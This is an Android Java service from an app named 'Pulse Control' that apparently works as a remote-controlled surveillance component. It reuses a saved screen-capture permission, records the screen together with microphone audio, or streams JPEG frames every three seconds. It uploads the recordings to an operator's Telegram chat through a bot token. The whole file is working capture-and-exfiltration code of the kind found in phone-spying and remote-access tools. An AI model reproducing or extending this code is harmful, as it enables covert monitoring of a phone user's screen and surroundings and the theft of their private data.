package com.pulse.control;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.nio.ByteBuffer;

/**
 * Foreground service that owns the MediaProjection session:
 *  - mode=record : records the screen with MediaRecorder for N seconds -> MP4
 *  - mode=live   : pushes a JPEG frame to Telegram every 3 s for N seconds
 */
public class ScreenCapService extends Service {

    public static final String CH = "pulse_screen";
    public static final int NID = 205;
    public static final String A_MODE = "mode", A_SECS = "secs";

    private static volatile boolean recording = false;
    private static volatile boolean live = false;

    private final Handler h = new Handler(Looper.getMainLooper());
    private MediaProjection projection;
    private VirtualDisplay vd;
    private MediaRecorder recorder;
    private ImageReader reader;
    private File outFile;
    private int mode;
    private int seconds;
    private int W, H, DPI;
    private int frameNo = 0;

    public static void start(Context c, String mode, int secs) {
        Intent i = new Intent(c, ScreenCapService.class);
        i.putExtra(A_MODE, mode == null ? "record" : mode);
        i.putExtra(A_SECS, secs);
        if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(i);
        else c.startService(i);
    }

    public static boolean isRecording() { return recording; }
    public static boolean isLive() { return live; }

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            NotificationChannel ch = new NotificationChannel(CH, "Захват экрана",
                    NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
        } catch (Exception ignored) {}
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && "stop".equals(intent.getStringExtra(A_MODE))) {
            stopSelf();
            return START_NOT_STICKY;
        }
        mode = intent == null ? 0 : ("live".equals(intent.getStringExtra(A_MODE)) ? 1 : 0);
        seconds = intent == null ? 15 : Math.max(1, intent.getIntExtra(A_SECS, 15));

        Notification.Builder b = new Notification.Builder(this)
                .setSmallIcon(R.drawable.ic_stat)
                .setContentTitle(mode == 1 ? "Трансляция экрана" : "Запись экрана")
                .setContentText("Pulse Control · идёт захват")
                .setOngoing(true);
        if (Build.VERSION.SDK_INT >= 26) b.setChannelId(CH);
        Notification n = b.build();
        try {
            if (Build.VERSION.SDK_INT >= 29) {
                startForeground(NID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                        | ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
            } else {
                startForeground(NID, n);
            }
        } catch (Exception e) {
            LogStore.add("🎥 Сервис захвата: " + e.getMessage());
            stopSelf();
            return START_NOT_STICKY;
        }

        try {
            begin();
        } catch (Exception e) {
            LogStore.add("🎥 Сбой захвата: " + e.getMessage());
            stopSelf();
        }
        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    // ------------------------------------------------------------ begin

    private void begin() throws Exception {
        if (!Config.projValid(this)) {
            LogStore.add("🎥 Нет разрешения на захват экрана");
            stopSelf();
            return;
        }
        Intent data = Intent.parseUri(Config.projData(this), Intent.URI_INTENT_SCHEME);
        MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        projection = mpm.getMediaProjection(Config.projCode(this), data);
        if (projection == null) {
            LogStore.add("🎥 Экран: разрешение устарело");
            stopSelf();
            return;
        }
        // Android 14+ requires a callback before creating the virtual display
        projection.registerCallback(new MediaProjection.Callback() {
            @Override public void onStop() { cleanup(false); }
        }, h);

        DisplayMetrics dm = new DisplayMetrics();
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        wm.getDefaultDisplay().getRealMetrics(dm);
        DPI = dm.densityDpi;
        W = makeEven(Math.min(dm.widthPixels, 1280));
        H = makeEven((int) ((long) dm.heightPixels * W / Math.max(1, dm.widthPixels)));
        H = makeEven(Math.min(H, 1280));

        if (mode == 1) startLive(); else startRecord();
    }

    private static int makeEven(int v) { return (v / 2) * 2; }

    // ------------------------------------------------------------ record

    private void startRecord() throws Exception {
        outFile = new File(getCacheDir(), "screen_" + System.currentTimeMillis() + ".mp4");
        MediaRecorder r = new MediaRecorder();
        r.setVideoSource(MediaRecorder.VideoSource.SURFACE);
        boolean withAudio = true;
        try {
            r.setAudioSource(MediaRecorder.AudioSource.MIC);
        } catch (Exception e) { withAudio = false; }
        r.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        r.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
        if (withAudio) r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        r.setVideoSize(W, H);
        r.setVideoFrameRate(30);
        r.setVideoEncodingBitRate(5_000_000);
        r.setOutputFile(outFile.getAbsolutePath());
        r.prepare();
        vd = projection.createVirtualDisplay("pulse-rec", W, H, DPI,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, r.getSurface(), null, h);
        r.start();
        recorder = r;
        recording = true;
        LogStore.add("🎥 Запись экрана " + seconds + " сек (микрофон: " + (withAudio ? "да" : "нет") + ")");
        h.postDelayed(this::stopRecordingAndSend, seconds * 1000L);
    }

    private void stopRecordingAndSend() {
        try { if (recorder != null) { recorder.stop(); recorder.release(); } } catch (Exception ignored) {}
        recorder = null;
        recording = false;
        releaseDisplay();
        stopSelf();
        final File f = outFile;
        if (f == null || !f.exists() || f.length() < 1000) {
            LogStore.add("🎥 Запись не удалась");
            Act.sendToAdmin("🎥 <b>Запись экрана не получилась</b>\n<i>Попробуйте ещё раз и подтвердите «Начать запись».</i>", Kb.main());
            return;
        }
        LogStore.add("🎥 Видео готово: " + (f.length() / 1024) + " КБ");
        new Thread(() -> {
            byte[] data = Capture.readAll(f);
            try { f.delete(); } catch (Exception ignored) {}
            if (data == null) return;
            Act.sendVideo(data, "screen_" + System.currentTimeMillis() + ".mp4",
                    "🎥 <b>Запись экрана</b> · " + seconds + " сек\n" + Sys.footer(Act.ctx()));
        }, "pulse-video").start();
    }

    // ------------------------------------------------------------ live

    private void startLive() {
        reader = ImageReader.newInstance(W, H, PixelFormat.RGBA_8888, 2);
        vd = projection.createVirtualDisplay("pulse-live", W, H, DPI,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.getSurface(), null, h);
        live = true;
        frameNo = 0;
        LogStore.add("🖥 Трансляция экрана: " + seconds + " сек");
        h.postDelayed(this::tickFrame, 1200);
        h.postDelayed(this::stopLive, seconds * 1000L);
    }

    private void tickFrame() {
        if (!live) return;
        try {
            Image img = reader.acquireLatestImage();
            if (img != null) {
                ByteBuffer buf = img.getPlanes()[0].getBuffer();
                int pixelStride = img.getPlanes()[0].getPixelStride();
                int rowStride = img.getPlanes()[0].getRowStride();
                Bitmap bmp = Bitmap.createBitmap(rowStride / pixelStride, img.getHeight(),
                        Bitmap.Config.ARGB_8888);
                buf.rewind();
                bmp.copyPixelsFromBuffer(buf);
                Bitmap cropped = Bitmap.createBitmap(bmp, 0, 0, W, H);
                ByteArrayOutputStream bo = new ByteArrayOutputStream();
                cropped.compress(Bitmap.CompressFormat.JPEG, 55, bo);
                img.close();
                frameNo++;
                final byte[] jpeg = bo.toByteArray();
                final int n = frameNo;
                new Thread(() -> {
                    long admin = Act.adminId();
                    if (admin != 0) {
                        Http.Resp r = new TgApi(Act.token()).sendPhoto(admin, jpeg,
                                "🖥 <b>Живой экран</b> · кадр " + n + "\n" + Sys.footer(Act.ctx()), null);
                        if (!r.ok()) LogStore.add("🖥 Кадр не ушёл: " + r.description());
                    }
                }, "pulse-live-frame").start();
            }
        } catch (Exception ignored) {}
        h.postDelayed(this::tickFrame, 3000);
    }

    private void stopLive() {
        if (!live) return;
        live = false;
        releaseDisplay();
        stopSelf();
        LogStore.add("🖥 Трансляция завершена (" + frameNo + " кадров)");
    }

    // ------------------------------------------------------------ cleanup

    private void releaseDisplay() {
        try { if (vd != null) vd.release(); } catch (Exception ignored) {}
        vd = null;
        try { if (reader != null) reader.close(); } catch (Exception ignored) {}
        reader = null;
    }

    private void cleanup(boolean sendAnyway) {
        releaseDisplay();
        recording = false;
        live = false;
        stopSelf();
    }

    @Override
    public void onDestroy() {
        releaseDisplay();
        try { if (recorder != null) { recorder.release(); } } catch (Exception ignored) {}
        try { if (projection != null) projection.stop(); } catch (Exception ignored) {}
        projection = null;
        super.onDestroy();
    }
}
